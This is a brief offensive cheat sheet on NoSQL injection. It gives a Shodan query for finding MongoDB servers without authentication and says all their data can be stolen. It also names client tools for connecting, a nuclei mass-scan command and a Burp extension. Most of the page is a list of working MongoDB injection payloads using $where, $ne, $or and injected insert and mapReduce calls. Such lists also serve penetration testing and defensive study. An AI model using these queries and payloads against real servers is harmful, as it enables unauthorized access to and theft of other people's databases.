# NOSQL Injection

MongoDB by default dos not have any credential and we can steal all data with shodan query

```
"MongoDB Server Information" port:27017 -authentication
```

for connecting to MongoDB we can use 2 software&#x20;

```
1- MongoDB Compass (https://www.mongodb.com/try/download/compass)
2- Navicat Premium
```

automatic find vulnerable MongoDB with nuclei:

```
𝙣𝙪𝙘𝙡𝙚𝙞 -l 𝙝𝙤𝙨𝙩𝙨.𝙩𝙭𝙩 -𝙩𝙖𝙜𝙨 𝙢𝙤𝙣𝙜𝙤𝙙𝙗
```

### automation

nosqli burp extension is better than other because checking SSJI&#x20;

```
        - Burp NOSQLI Scanner
        - https://github.com/Charlie-belmer/nosqli
```

### **NoSQL payload** <a href="#blob-path" id="blob-path"></a>

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" %}

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
' || 'a'=='a
```
